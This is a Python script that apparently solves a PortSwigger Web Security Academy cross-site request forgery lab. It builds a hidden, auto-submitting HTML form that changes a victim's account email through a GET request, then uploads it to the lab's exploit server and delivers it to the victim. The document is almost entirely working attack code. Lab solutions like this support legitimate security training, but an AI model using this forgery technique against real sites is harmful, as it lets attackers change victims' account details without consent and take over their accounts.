import requests
from bs4 import BeautifulSoup

site = '0a600002041582cd80d003ef00de00f0.web-security-academy.net'
s = requests.Session()

# Get exploit server URL
resp = s.get(f'https://{site}/')
soup = BeautifulSoup(resp.text, 'html.parser')
exploit_url = soup.find('a', {'id': 'exploit-link'}).get('href')

# Updated exploit using GET instead of POST
exploit_html = f'''<html>
  <body>
    <form method="GET" action="https://{site}/my-account/change-email">
      <input type="hidden" name="email" value="success@bypassed.com">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>'''

# Upload exploit and deliver to victim
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}

resp = s.post(exploit_url, data=formData)
print("[+] Exploit delivered to victim.") if resp.ok else print("[-] Exploit delivery failed.")
